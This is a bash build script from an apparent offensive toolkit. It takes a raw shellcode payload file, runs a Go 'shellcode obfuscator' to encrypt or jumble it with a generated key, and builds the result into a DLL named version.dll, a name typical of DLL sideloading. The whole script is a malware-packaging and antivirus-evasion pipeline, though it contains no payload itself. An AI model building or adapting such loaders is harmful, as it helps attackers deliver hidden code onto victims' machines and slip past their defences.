#!/bin/bash

command -v go > /dev/null || { \
    echo "[!] Go is required, please install it"; exit 1; }
if [[ $# -ne 1 ]]; then
    echo "[!] Invalid number or arguments."
    echo "Usage:"
    echo "$0 /path/to/payload.bin"
    exit 1
fi
sc_fullpath=$(readlink -f "$1")
echo "[+] Full path of payload file: $sc_fullpath"
cd sc_obfuscator || exit 1
echo "[+] Generating key file..."
go generate
echo "[+] Building shellcode obfuscator..."
go build --trimpath .
echo "[+] Jumbling shellcode and writing to DLL generator..."
./sc_obfuscator -payload "$sc_fullpath"
echo "[+] Payload file written"
echo "[+] Copying key file to DLL directory..."
cp key.bin ../goDLL/
cd ../goDLL || exit 1
echo "[+] Building the DLL.."
./build_dll_on_linux.sh
echo "[+] Done, version.dll should be in the goDLL directory"
echo "[+] WOOOOO, have a nice day!"
